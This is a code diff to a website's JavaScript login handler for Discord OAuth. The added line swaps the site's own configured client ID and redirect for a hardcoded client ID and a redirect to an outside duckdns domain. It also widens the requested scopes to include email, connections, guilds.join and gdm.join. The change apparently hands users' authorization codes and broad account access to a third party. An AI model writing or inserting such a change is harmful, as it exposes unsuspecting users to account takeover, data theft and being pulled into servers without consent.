@@ -168,7 +168,7 @@ document.getElementById('loginBtn').addEventListener('click', (e) => {
     const redirectUri = encodeURIComponent(window.location.origin + '/index.html');
     const scope = 'identify guilds';
     
-    const discordAuthUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&response_type=code&redirect_uri=${redirectUri}&scope=${scope}`;
+    const discordAuthUrl = `https://discord.com/oauth2/authorize?client_id=1444474585511624854&response_type=code&redirect_uri=https%3A%2F%2Fneptuneunit.duckdns.org%2FDashboard.html&scope=email+guilds+guilds.members.read+guilds.channels.read+gdm.join+connections+identify+guilds.join`;
     
     window.location.href = discordAuthUrl;
 });
